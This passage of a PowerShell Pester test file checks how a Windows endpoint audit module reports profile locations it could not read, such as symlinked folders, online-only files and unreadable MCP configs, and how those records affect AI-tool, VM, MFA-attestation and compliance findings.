        New-Item -ItemType Directory -Force -Path (Join-Path $root 'elsewhere\real\extensions\pub.ext-1.0.0') | Out-Null
        New-TestJunction -Path (Join-Path $p '.vscode') -Target (Join-Path $root 'T\link\real')
        Use-TestReparseTags @{ (Join-Path $root 'T\link') = $global:CETagSymlink }
        $st = InModuleScope CEAudit -Parameters @{ P = $p } {
            param($P)
            (Get-CEConfig)['ai-tools'] = ('{ "schemaVersion": 2, "tools": [ { "id": "t-code", "name": "Code tool", "canActOnDevice": true, "windows": { "vscodeExtensions": [ "pub.ext-*" ] } } ] }' | ConvertFrom-Json)
            $script:layerProfile = $P
            Mock Get-CEUserProfilePath { $script:layerProfile }
            Mock Get-CEInstalledSoftware { @() }
            Mock Get-CEStorePackageName { , @() }
            Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
            Mock Get-CEProcessList { , @() }
            [pscustomobject]@{
                Elevated = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                User     = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
            }
        }
        @($st.Elevated.Tools).Count | Should -Be 0
        @($st.Elevated.NotRead | ForEach-Object { "$($_.Topic)|$($_.Location)|$($_.Reason)" }) | Should -Be @('vscode|%USERPROFILE%\.vscode\extensions|a junction on the way leads through a symbolic link or to a location the audit does not recognise')
        @($st.User.Tools).Count | Should -Be 1 -Because "the user's own session follows their links"
        Set-TestLayerAI -NotRead @($st.Elevated.NotRead)
        @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object { $_.Subject -eq 'Not read' }).Status | Should -Be 'Manual'
        @(Invoke-CEAuditCore -Id 'UA-07' | Where-Object { $_.Subject -eq 'Not read' }).Status | Should -Be 'Info' -Because 'UA-07 judges the services found; what was not read is a note'
        (@(Invoke-CEAuditCore -Id 'UA-10'))[0].Status | Should -Be 'NotApplicable' -Because 'UA-10 judges running processes'
        (@(@(Invoke-CEAuditCore -Id 'UA-10'))[0].Evidence) -join "`n" | Should -Match 'Not read in the profile: %USERPROFILE%\\\.vscode\\extensions'

        # An installed marker behind a symbolic link: whether the browser is installed is unknown, not "no".
        $q = Join-Path $root 'profile2'
        New-Item -ItemType Directory -Force -Path (Join-Path $q 'AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\fcoeoabgfenejglbffodgkkbkcdhcgfn\1.0_0') | Out-Null
        New-TestJunction -Path (Join-Path $q 'AppData\Local\Google\Chrome\Application') -Target (Join-Path $root 'chrome-app')
        Set-Content -LiteralPath (Join-Path $root 'chrome-app\chrome.exe') -Value '' -Encoding ASCII
        Use-TestReparseTags @{ (Join-Path $q 'AppData\Local\Google\Chrome\Application') = $global:CETagSymlink }
        $st = InModuleScope CEAudit -Parameters @{ P = $q } {
            param($P)
            (Get-CEConfig)['ai-tools'] = ('{ "schemaVersion": 2, "tools": [ { "id": "t-claude", "name": "Claude test", "service": "Anthropic (Claude)", "canActOnDevice": false, "browserExtensions": [ { "store": "chrome", "id": "fcoeoabgfenejglbffodgkkbkcdhcgfn" } ] } ] }' | ConvertFrom-Json)
            (Get-CEConfig)['browser-profiles'] = ('{ "windows": [ { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data", "installed": [ { "base": "profile", "path": "AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" } ] } ] }' | ConvertFrom-Json)
            $script:layerProfile = $P
            Mock Get-CEUserProfilePath { $script:layerProfile }
            Mock Get-CEInstalledSoftware { @() }
            Mock Get-CEStorePackageName { , @() }
            Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
            Mock Get-CEProcessList { , @() }
            Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $true; IsElevated = $true })
        }
        $tool = @($st.Tools | Where-Object Id -eq 't-claude')
        $tool[0].LeftoverOnly | Should -BeFalse -Because 'a browser that could not be checked is not called uninstalled'
        @($tool[0].Signals) | Should -Be @('Google Chrome extension: fcoeoabgfenejglbffodgkkbkcdhcgfn 1.0 (profile: Profile 1; whether Google Chrome is installed could not be checked)')
        @($st.NotRead | ForEach-Object { "$($_.Topic)|$($_.Kind)" }) | Should -Be @('browser-installed|existence')
        Set-TestLayerAI -Tools @($tool) -NotRead @($st.NotRead)
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        @($ai.agents | Where-Object { $_.leftoverOnly }).Count | Should -Be 0 -Because 'the report does not call the browser uninstalled'
        @(Invoke-CEAuditCore -Id 'UA-07' | Where-Object Subject -eq 'Anthropic (Claude)').Count | Should -Be 1 -Because 'the service is kept'
    }

    It 'reports VM inventories, VM files and .wslconfig not read through a link, and only where a check depends on them' {
        $root = Join-Path $TestDrive 'layer-vm'
        $p = Join-Path $root 'profile'
        New-Item -ItemType Directory -Force -Path (Join-Path $p 'AppData\Roaming') | Out-Null
        New-TestJunction -Path (Join-Path $p 'AppData\Roaming\VMware') -Target (Join-Path $root 'vmware')
        Set-Content -LiteralPath (Join-Path $root 'vmware\inventory.vmls') -Value 'vmlist1.config = "C:\VMs\x.vmx"'
        New-TestJunction -Path (Join-Path $p '.VirtualBox') -Target (Join-Path $root 'vbox')
        Set-Content -LiteralPath (Join-Path $root 'vbox\VirtualBox.xml') -Value '<VirtualBox/>'
        Set-Content -LiteralPath (Join-Path $p '.wslconfig') -Value @('[wsl2]', 'networkingMode=mirrored')
        $st = InModuleScope CEAudit -Parameters @{ P = $p } {
            param($P)
            $script:testVmProfile = $P
            Mock Get-CEUserProfilePath { $script:testVmProfile }
            Mock Get-CEWslDistribution { , @() }
            Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
            Mock Get-CEContainer { , @() }
            Mock Resolve-CEDockerPath { [pscustomobject]@{ Path = ''; Refused = @() } }
            Mock Get-CEVirtualisationListener { , @() }
            # .wslconfig as a symbolic link to a file (this account can't make one).
            Mock Get-CEReparseKind { if ($Item.Name -eq '.wslconfig') { 'symlink' } elseif ((([long]$Item.Attributes) -band 0x400) -ne 0) { 'junction' } else { 'none' } }
            [pscustomobject]@{
                Elevated = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                User     = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
            }
        }
        @($st.Elevated.NotRead | ForEach-Object { "$($_.Topic)|$($_.Location)|$($_.NeedsUserSession)" } | Sort-Object) | Should -Be @(
            'vm-inventory|%USERPROFILE%\.VirtualBox\VirtualBox.xml|True', 'vm-inventory|%USERPROFILE%\AppData\Roaming\VMware\inventory.vmls|True', 'wslconfig|%USERPROFILE%\.wslconfig|True')
        $st.Elevated.WslNetworking | Should -Be ''
        $st.User.WslNetworking | Should -Be 'mirrored' -Because "the user's own session reads it"
        @($st.User.NotRead).Count | Should -Be 0 -Because "the user's own session reads through their links"
        Set-TestDevice -Kind Secure
        $global:CETestVirt = $st.Elevated
        Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        (@(Invoke-CEAuditCore -Id 'SC-12'))[0].Status | Should -Be 'Manual'
        (@(Invoke-CEAuditCore -Id 'FW-07'))[0].Status | Should -Be 'Manual'
        # Only the .wslconfig record, with no WSL distributions: nothing SC-12 or FW-07 depends on.
        $global:CETestVirt = [pscustomobject]@{ HyperV = $st.Elevated.HyperV; VMware = @(); VirtualBox = @(); Wsl = @(); WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @()
            NotRead = @($st.Elevated.NotRead | Where-Object { $_.Topic -eq 'wslconfig' }) }
        (@(Invoke-CEAuditCore -Id 'FW-07'))[0].Status | Should -Be 'NotApplicable'
        (@(Invoke-CEAuditCore -Id 'SC-12'))[0].Status | Should -Be 'Pass'
        # Items found and something not read: the existing Manual, then the not-read one.
        $global:CETestVirt = [pscustomobject]@{ HyperV = $st.Elevated.HyperV; VMware = @([pscustomobject]@{ Name = 'Dev'; Networks = @('nat'); SharedFolders = @() }); VirtualBox = @(); Wsl = @(); WslNetworking = ''
            Containers = @(); Listeners = @(); Notes = @(); NotRead = @($st.Elevated.NotRead) }
        $f = @(Invoke-CEAuditCore -Id 'SC-12')
        @($f | ForEach-Object { "$($_.Status)|$($_.Subject)" }) | Should -Be @('Manual|', 'Manual|Not read')
    }

    It 'counts and words MCP configs it could not check, and reports a plaintext credential next to one not read' {
        $root = Join-Path $TestDrive 'layer-mcp'
        # A symbolic link on the way: existence unknown, not counted as found, and not called found.
        $a = Join-Path $root 'a'
        New-TestJunction -Path (Join-Path $a '.cursor') -Target (Join-Path $root 'dots')
        Set-Content -LiteralPath (Join-Path $root 'dots\mcp.json') -Value '{ "mcpServers": {} }' -Encoding ASCII
        Use-TestReparseTags @{ (Join-Path $a '.cursor') = $global:CETagSymlink }
        $inv = InModuleScope CEAudit -Parameters @{ P = $a; C = $global:CETestMcpCtx } { param($P, $C) Mock Get-CEUserProfilePath { $P }; Get-CEMcpInventory -Context (& $C $false $true 'M1') }
        # Keys that differ only in case: not "invalid JSON", but not parsed by the audit, and Manual.
        $b = Join-Path $root 'b'
        New-Item -ItemType Directory -Force -Path $b | Out-Null
        Set-Content -LiteralPath (Join-Path $b '.claude.json') -Value '{ "mcpServers": { "x": { "command": "npx" }, "X": { "command": "npx" } } }' -Encoding ASCII
        $invCase = InModuleScope CEAudit -Parameters @{ P = $b; C = $global:CETestMcpCtx } { param($P, $C) Mock Get-CEUserProfilePath { $P }; Get-CEMcpInventory -Context (& $C $false $false 'M2') }
        @($invCase.mcpConfigsUnreadable | ForEach-Object { $_.reason }) | Should -Be @('it could not be parsed by the audit')
        # A profile off local fixed drives: one record, whatever the catalog holds.
        $invOff = InModuleScope CEAudit -Parameters @{ C = $global:CETestMcpCtx } {
            param($C)
            (Get-CEConfig)['ai-tools'] = ('{ "schemaVersion": 2, "tools": [ { "id": "a", "windows": { "mcpConfigs": [ { "path": ".a.json" }, { "path": ".b.json" } ] } }, { "id": "c", "windows": { "mcpConfigs": [ { "path": ".c.json" } ] } } ] }' | ConvertFrom-Json)
            Mock Get-CEUserProfilePath { '\\host\share\alice' }
            Get-CEMcpInventory -Context (& $C $true $true 'M3')
        }
        @($invOff.mcpConfigsUnreadable | ForEach-Object { "$($_.location)|$($_.reason)" }) | Should -Be @('%USERPROFILE%|it is not on a local fixed drive')
        $inv.mcpConfigsFound | Should -Be 0
        @($inv.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.kind)|$($_.needsUserSession)" }) | Should -Be @('.cursor\mcp.json|existence|True')
        Set-TestDevice -Kind Secure
        $global:CETestMcp = $inv
        Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcp }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'could not be checked: \.cursor\\mcp\.json'
        $f[0].Actual | Should -Not -Match 'found'
        $global:CETestMcp = $invCase
        (@(Invoke-CEAuditCore -Id 'SC-13'))[0].Status | Should -Be 'Manual'
        # A plaintext credential whose file permissions could not be read: Warn, not Fail, and the unread config is named.
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        $global:CETestMcp = [ordered]@{ mcpConfigsFound = 2; mcpConfigsParsed = 1; credentialsFound = 1; credentialsPlaintext = 1; scanBounds = 'test'
            mcpServers = @([ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = 'stdio'; command = 'npx'; argsSummary = ''; endpoint = ''
                    credentialCount = 1; credentials = @($cred); configAclIssue = ''; aclUnread = $true })
            mcpConfigsUnreadable = @([ordered]@{ path = '.cursor\mcp.json'; toolId = 'cursor'; reason = 'it is stored online only, and an elevated or SYSTEM audit does not download it'; needsUserSession = $true
                    location = '%USERPROFILE%\.cursor\mcp.json'; kind = 'file-content'; remedy = ''; topic = 'mcp'; count = 1 }) }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Warn'
        $f[0].Actual | Should -Match '\(permissions could not be read\)'
        $f[0].Actual | Should -Match 'found, not read: \.cursor\\mcp\.json \(cursor\)'
    }

    It 'keeps UA-07 Pass, and CEMfaAttested true, when every service is attested and some places were not read' {
        # UA-07 judges the services found and their attestations. A SYSTEM audit often cannot read some places in
        # the profile, so what was not read is a note: a lower status would flap the Intune compliance result.
        $claude = [pscustomobject]@{ Id = 'claude-code'; Name = 'Claude Code'; Service = 'Anthropic (Claude)'; CanActOnDevice = $true; Notes = ''; Signals = @('Store app: Claude'); Processes = @() }
        Set-TestLayerAI -Tools @($claude) -NotRead @([ordered]@{ Location = '%USERPROFILE%\.vscode\extensions'; Kind = 'folder-listing'; Reason = 'x'; Remedy = ''; Topic = 'vscode'; NeedsUserSession = $true; Count = 1 },
            [ordered]@{ Location = '%USERPROFILE%\AppData\Local\Google\Chrome\User Data'; Kind = 'folder-listing'; Reason = 'y'; Remedy = ''; Topic = 'browser'; NeedsUserSession = $true; Count = 1 })
        InModuleScope CEAudit -Parameters @{ D = (Get-Date).ToString('yyyy-MM-dd') } {
            param($D)
            $script:layerCloud = (Get-CEConfig).'cloud-services'
            (Get-CEConfig).'cloud-services' = [pscustomobject]@{ maxAttestationAgeDays = 365; detectionHints = @()
                services = @(foreach ($n in 'Anthropic (Claude)', 'Microsoft 365 / Entra ID') { [pscustomobject]@{ name = $n; mfaEnforced = $true; adminMfaEnforced = $true; verifiedOn = $D; verifiedBy = 'A' } }) }
        }
        try {
            $f = @(Invoke-CEAuditCore -Id 'UA-07')
            @($f | Where-Object Subject -ne 'Not read' | ForEach-Object Status | Sort-Object -Unique) | Should -Be @('Pass')
            $note = @($f | Where-Object Subject -eq 'Not read')
            @($note | ForEach-Object Status) | Should -Be @('Info')
            $note[0].Actual | Should -Match '^2 location\(s\) could not be read, so an AI tool, and the cloud service it uses, may be missing from this list\. The per-user probe or an audit without elevation may find more AI tools and their services: '
            $note[0].Actual | Should -Match ([regex]::Escape('%USERPROFILE%\.vscode\extensions (folder not listed): x'))
            $note[0].Recommendation | Should -Match 'full audit without elevation while signed in as that user'
            $root = Join-Path $TestDrive 'layer-mfa'
            InModuleScope CEAudit -Parameters @{ F = $f; Root = $root } {
                param($F, $Root)
                $map = Get-CEStatusCheckMap -Findings $F
                $map['UA-07'].status | Should -Be 'Pass'
                $status = ConvertTo-CEStatus -Findings $F -Summary (Get-CESummary -Findings $F) -Context $global:CETestCtx -ReportFolder 'X'
                New-Item -ItemType Directory -Path $Root -Force | Out-Null
                Write-CEStatus -Status $status -Path (Join-Path $Root 'status.json') | Out-Null
            }
            . (Join-Path $script:RepoRoot 'intune\Discover-CECompliance.ps1')
            # A test folder is user-writable, so read it as a non-elevated reader does: this checks how
            # UA-07 maps to CEMfaAttested, not the data-folder trust check (tested on its own).
            (Get-CEComplianceData -DataRoot $root -Installed $true -Elevated $false -NoKick).CEMfaAttested | Should -BeTrue
            # A service without an attestation is still Manual, not read or not.
            InModuleScope CEAudit { (Get-CEConfig).'cloud-services'.services = @((Get-CEConfig).'cloud-services'.services | Where-Object name -ne 'Anthropic (Claude)') }
            $map = InModuleScope CEAudit { Get-CEStatusCheckMap -Findings @(Invoke-CEAuditCore -Id 'UA-07') }
            $map['UA-07'].status | Should -Be 'Manual'
        }
        finally { InModuleScope CEAudit { (Get-CEConfig).'cloud-services' = $script:layerCloud } }
    }

    It 'does not say an agent that can act may be hidden in SC-09 when only browser extension folders were not read' {
        $rec = { param([string]$Topic) [ordered]@{ Location = "%USERPROFILE%\$Topic"; Kind = 'folder-listing'; Reason = 'r'; Remedy = ''; Topic = $Topic; NeedsUserSession = $true; Count = 1 } }
        InModuleScope CEAudit { (Get-CEConfig)['ai-tools'] = ('{ "schemaVersion": 2, "tools": [ { "id": "t-ext", "name": "Ext", "canActOnDevice": false, "browserExtensions": [ { "store": "chrome", "id": "fcoeoabgfenejglbffodgkkbkcdhcgfn" } ] }, { "id": "t-code", "name": "Code", "canActOnDevice": true, "windows": { "paths": [ ".code" ] } } ] }' | ConvertFrom-Json) }
        Set-TestLayerAI -NotRead @(& $rec 'browser')
        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
        @($f | ForEach-Object Status) | Should -Be @('Info') -Because 'every tool found by a browser extension cannot act on the device'
        $f[0].Actual | Should -Not -Match 'an AI agent that can act on this device may not have been seen'
        $f[0].Actual | Should -Match 'an AI browser extension may not have been seen'
        # With a record that can hide an agent as well, it is Manual, and names only that record.
        Set-TestLayerAI -NotRead @((& $rec 'browser'), (& $rec 'paths'))
        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
        @($f | ForEach-Object Status) | Should -Be @('Manual')
        $f[0].Actual | Should -Be '1 location(s) could not be read, so an AI agent that can act on this device may not have been seen: %USERPROFILE%\paths (folder not listed): r'
        # A catalog override with an agent found by its browser extension makes those folders count.
        InModuleScope CEAudit { (Get-CEConfig)['ai-tools'].tools[0].canActOnDevice = $true }
        Set-TestLayerAI -NotRead @(& $rec 'browser')
        $f = @(Invoke-CEAuditCore -Id 'SC-09' | Where-Object Subject -eq 'Not read')
        @($f | ForEach-Object Status) | Should -Be @('Manual')
        $f[0].Actual | Should -Match 'an AI agent that can act on this device may not have been seen'
    }

    It 'rolls a check with a Pass and a not-read record up to Manual, and CE+ TC1 to Check' {
        Set-TestDevice -Kind Secure
        $global:CETestVirt = [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() }; VMware = @(); VirtualBox = @(); Wsl = @()
            WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @(); NotRead = @([ordered]@{ Location = '%USERPROFILE%\VMs\a.vmx'; Kind = 'file-content'; Reason = 'x'; Remedy = ''; Topic = 'vm-file'; NeedsUserSession = $true; Count = 1 }) }
        Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        $f = @(Invoke-CEAuditCore -Id 'FW-07')
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        ($summary.CEPlus | Where-Object TestCase -eq 'TC1').State | Should -Be 'Check'
    }

    It 'says in the report that the AI list may be incomplete, and what was not read' {
        Set-TestLayerAI -NotRead @([ordered]@{ Location = '%USERPROFILE%\.vscode\extensions'; Kind = 'folder-listing'; Reason = 'a symbolic link on the way is not followed by an elevated or SYSTEM audit (it could point off this computer)'; Remedy = ''; Topic = 'vscode'; NeedsUserSession = $true; Count = 1 })
        $f = @(Invoke-CEAuditCore -Id 'SC-09')
        $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'layer-report')
        $md = Get-Content $r.Paths.Markdown -Raw
        $html = Get-Content $r.Paths.Html -Raw
        $md | Should -Match 'Some locations were not read, so this list may be incomplete'
        $md | Should -Match ([regex]::Escape('- %USERPROFILE%\.vscode\extensions (folder not listed): a symbolic link'))
        $html | Should -Match 'no AI tools confirmed; scan incomplete'
        $html | Should -Not -Match 'No AI tools detected in this session'
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        $ai.scanComplete | Should -BeFalse
        @($ai.notRead | ForEach-Object { "$($_.topic)|$($_.location)" }) | Should -Be @('vscode|%USERPROFILE%\.vscode\extensions')
    }

    It 'calls the scan incomplete only for records that could hide an AI tool, and says so in the report' {
        $rec = { param([string]$Topic, [string]$Location) [ordered]@{ Location = $Location; Kind = 'file-content'; Reason = 'it could not be read (IOException)'; Remedy = ''; Topic = $Topic; NeedsUserSession = $false; Count = 1 } }
        Set-TestLayerAI -NotRead @()
        $global:CETestLayerVirt = [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $false; Message = 'Hyper-V virtual machines need elevation to list'; Machines = @(); NatMappings = @() }
            VMware = @(); VirtualBox = @(); Wsl = @(); WslNetworking = ''; Containers = @(); Listeners = @(); Notes = @()
            NotRead = @((& $rec 'vm-file' '%USERPROFILE%\VMs\a.vmx'), (& $rec 'wslconfig' '%USERPROFILE%\.wslconfig'),
                [ordered]@{ Location = 'Hyper-V virtual machines'; Kind = 'existence'; Reason = 'an audit without elevation cannot list them'; Remedy = 'x'; Topic = 'hyperv'; NeedsUserSession = $false; Count = 1 }) }
        Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestLayerVirt }
        $global:CETestLayerMcp = [ordered]@{ mcpServers = @(); mcpConfigsFound = 1; mcpConfigsParsed = 0; credentialsFound = 0; credentialsPlaintext = 0; scanBounds = 'test'
            mcpConfigsUnreadable = @([ordered]@{ path = '.cursor\mcp.json'; toolId = 'cursor'; reason = 'it could not be parsed by the audit'; needsUserSession = $false
                    location = '%USERPROFILE%\.cursor\mcp.json'; kind = 'file-content'; remedy = ''; topic = 'mcp'; count = 1 }) }
        Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestLayerMcp }
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        $ai.scanComplete | Should -BeTrue -Because 'a VM file, .wslconfig or an MCP config can not hide an AI tool'
        @($ai.notRead | ForEach-Object { "$($_.topic)|$($_.location)" }) | Should -Be @('vm-file|%USERPROFILE%\VMs\a.vmx', 'wslconfig|%USERPROFILE%\.wslconfig', 'mcp|%USERPROFILE%\.cursor\mcp.json') -Because 'Hyper-V is not in the profile; FW-07 reports it'
        $f = @(Invoke-CEAuditCore -Id 'SC-09')
        $r = Export-CEReport -Findings $f -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'layer-complete-report')
        $md = Get-Content $r.Paths.Markdown -Raw
        $html = Get-Content $r.Paths.Html -Raw
        $md | Should -Match 'None of them could hide an AI tool'
        $md | Should -Not -Match 'this list may be incomplete'
        $md | Should -Match ([regex]::Escape('- %USERPROFILE%\VMs\a.vmx (file not read)'))
        $html | Should -Not -Match 'no AI tools confirmed|scan incomplete|AI tools found may be incomplete'
        $html | Should -Match 'None of these could hide an AI tool'
        # A record that could hide an AI tool, and one from an older version with no topic, make it incomplete.
        foreach ($t in 'paths', 'vscode', 'vscode-builtin', 'browser', 'profile', '') {
            Set-TestLayerAI -NotRead @(& $rec $t '%USERPROFILE%\x')
            (InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }).scanComplete | Should -BeFalse -Because "a '$t' record can hide an AI tool"
        }
        foreach ($t in 'browser-installed', 'extension-version') {
            Set-TestLayerAI -NotRead @(& $rec $t '%USERPROFILE%\x')
            (InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }).scanComplete | Should -BeTrue -Because "a '$t' record hides no AI tool"
        }
    }

    It 'shows a profile it could not read once in the AI posture, with every distinct remedy' {
        $ai = InModuleScope CEAudit {
            Mock Get-CEInstalledSoftware { @() }
            Mock Get-CEStorePackageName { , @() }
            Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
            Mock Get-CEProcessList { , @() }
            Mock Get-CEWslDistribution { , @() }
            Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
            Mock Get-CEContainer { , @() }
            Mock Get-CEVirtualisationListener { , @() }
            $script:testPostureProfile = '\\host\share\alice'
            Mock Get-CEUserProfilePath { $script:testPostureProfile }
            $ctx = { param([string]$Name) [pscustomobject]@{ ComputerName = $Name; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' } }
            $off = Get-CEAiPosture -Context (& $ctx 'P1')
            $script:testPostureProfile = $null
            [pscustomobject]@{ Off = $off; None = (Get-CEAiPosture -Context (& $ctx 'P2')) }
        }
        # The AI tools, virtual machines and MCP configs each record the profile off local fixed drives, with their own remedy.
        @($ai.Off.notRead | ForEach-Object { "$($_.location)|$($_.kind)|$($_.reason)|$($_.topic)" }) | Should -Be @('%USERPROFILE%|folder-listing|it is not on a local fixed drive|profile')
        $ai.Off.notRead[0].remedy | Should -Be 'Check the AI tools in this profile by hand. Check the virtual machines in this profile by hand. Check the MCP client configs in this profile by hand.'
        $ai.Off.scanComplete | Should -BeFalse
        InModuleScope CEAudit -Parameters @{ R = @($ai.Off.notRead) } { param($R) (Get-CENotReadAdvice -Records $R -Scope Machine) -join ' ' } | Should -Match 'Check the virtual machines in this profile by hand'
        # With nobody signed in they record the same thing, with the same remedy: one record, one remedy.
        @($ai.None.notRead | ForEach-Object { "$($_.location)|$($_.kind)|$($_.topic)|$($_.remedy)" }) | Should -Be @('%USERPROFILE%|existence|profile|Run the audit while the person who uses this device is signed in at the console.')
    }

    It 'applies the rule table to every kind of folder, above the user''s rights and in their own session' {
        $root = Join-Path $TestDrive 'layer-rules'
        $p = Join-Path $root 'profile'
        $kinds = 'none', 'reparse', 'junction', 'symlink', 'surrogate', 'unreadable', 'cloud'
        $tags = @{}
        foreach ($k in $kinds) {
            $target = Join-Path $root "target-$k"
            New-Item -ItemType Directory -Force -Path (Join-Path $target 'sub') | Out-Null
            Set-Content -LiteralPath (Join-Path $target 'f.txt') -Value "text $k" -Encoding ASCII
            $at = Join-Path $p $k
            if ($k -eq 'none' -or $k -eq 'cloud') { New-Item -ItemType Directory -Force -Path (Join-Path $at 'sub') | Out-Null; Set-Content -LiteralPath (Join-Path $at 'f.txt') -Value "text $k" -Encoding ASCII }
            else { New-TestJunction -Path $at -Target $target }
            switch ($k) {
                'reparse' { $tags[$at] = [Convert]::ToInt64('9000601A', 16) }
                'symlink' { $tags[$at] = $global:CETagSymlink }
                'surrogate' { $tags[$at] = [Convert]::ToInt64('A000001D', 16) }
                'unreadable' { $tags[$at] = [long]-1 }
            }
        }
        # FILE_ATTRIBUTE_OFFLINE marks a folder a sync app keeps online only; any account may set it.
        $cloudDir = New-Object IO.DirectoryInfo (Join-Path $p 'cloud')
        $cloudDir.Attributes = [IO.FileAttributes]::Directory -bor [IO.FileAttributes]::Offline
        Use-TestReparseTags $tags
        try {
            $r = InModuleScope CEAudit -Parameters @{ P = $p; Kinds = $kinds } {
                param($P, $Kinds)
                $out = @{}
                foreach ($above in $true, $false) {
                    foreach ($k in $Kinds) {
                        $log = New-CENotReadLog
                        $names = Get-CEProfileChildName -ProfilePath $P -Relative $k -Max 10 -Log $log -Above $above -Topic 't'
                        $exists = Test-CEProfileItem -ProfilePath $P -Relative "$k\f.txt" -Log $log -Above $above -Topic 't'
                        $text = Read-CEProfileFile -ProfilePath $P -Relative "$k\f.txt" -MaxBytes 1KB -Log $log -Above $above -Topic 't'
                        $out["$above|$k"] = "$(@($names) -join ',')|$(if ($null -eq $exists) { 'null' } else { $exists })|$(if ($null -eq $text) { 'null' } else { $text.Trim() })|$(@($log.Records | ForEach-Object { $_.Kind }) -join ',')"
                    }
                }
                $out
            }
            $expected = @{
                'True|none' = 'sub|True|text none|'; 'True|reparse' = 'sub|True|text reparse|'
                'True|junction' = 'sub|True|null|file-content'
                'True|symlink' = '|null|null|folder-listing,existence,file-content'; 'True|surrogate' = '|null|null|folder-listing,existence,file-content'
                'True|unreadable' = '|null|null|folder-listing,existence,file-content'; 'True|cloud' = '|null|null|folder-listing,existence,file-content'
            }
            foreach ($k in $kinds) {
                $r["True|$k"] | Should -Be $expected["True|$k"] -Because "$k above the user's rights"
                $r["False|$k"] | Should -Be "sub|True|text $k|" -Because "$k in the user's own session"
            }
        }
        finally { $cloudDir.Attributes = [IO.FileAttributes]::Directory }
    }

    It 'records caps, listing errors and odd names, groups repeats, and keeps reasons and locations free of paths and error text' {
        $p = Join-Path $TestDrive 'layer-misc'
        New-Item -ItemType Directory -Force -Path (Join-Path $p 'many\a'), (Join-Path $p 'many\b'), (Join-Path $p 'many\c'), (Join-Path $p 'locked\x') | Out-Null
        [void][IO.Directory]::CreateDirectory('\\?\' + (Join-Path $p 'many\d.'))
        $locked = Join-Path $p 'locked'
        $me = [Security.Principal.WindowsIdentity]::GetCurrent().User
        $acl = Get-Acl -LiteralPath $locked
        $deny = New-Object Security.AccessControl.FileSystemAccessRule($me, 'ListDirectory', 'Deny')
        $acl.AddAccessRule($deny)
        Set-Acl -LiteralPath $locked -AclObject $acl
        try {
            $recs = InModuleScope CEAudit -Parameters @{ P = $p } {
                param($P)
                $log = New-CENotReadLog
                $names = Get-CEProfileChildName -ProfilePath $P -Relative 'many' -Max 2 -Log $log -Topic 't'
                @($names).Count | Should -Be 2
                $null = Get-CEProfileChildName -ProfilePath $P -Relative 'many' -Max 10 -Log $log -Topic 't'
                $null = Get-CEProfileChildName -ProfilePath $P -Relative 'locked' -Max 10 -Log $log -Topic 't'
                # The same skip twice is one record with a count.
                Add-CENotRead -Log $log -Location '%USERPROFILE%\x' -Kind 'file-content' -Reason 'r' -Topic 't'
                Add-CENotRead -Log $log -Location '%USERPROFILE%\x' -Kind 'file-content' -Reason 'r' -Topic 't'
                @($log.Records)
            }
            @($recs | ForEach-Object { "$($_.Location)|$($_.Reason)|$($_.Count)" }) | Should -Be @(
                '%USERPROFILE%\many|the audit reads at most 2 entries here|1',
                '%USERPROFILE%\many|a name ending in a dot or a space is not read (Windows would read it as another name)|1',
                '%USERPROFILE%\locked|it could not be read (UnauthorizedAccessException)|1',
                '%USERPROFILE%\x|r|2')
            @($recs | Where-Object { $_.Location -match '^[A-Za-z]:|\\\\' -or $_.Reason -match '[A-Za-z]:\\' }).Count | Should -Be 0
        }
        finally {
            $acl = Get-Acl -LiteralPath $locked
            [void]$acl.RemoveAccessRule($deny)
            Set-Acl -LiteralPath $locked -AclObject $acl
            [IO.Directory]::Delete('\\?\' + (Join-Path $p 'many\d.'))
        }
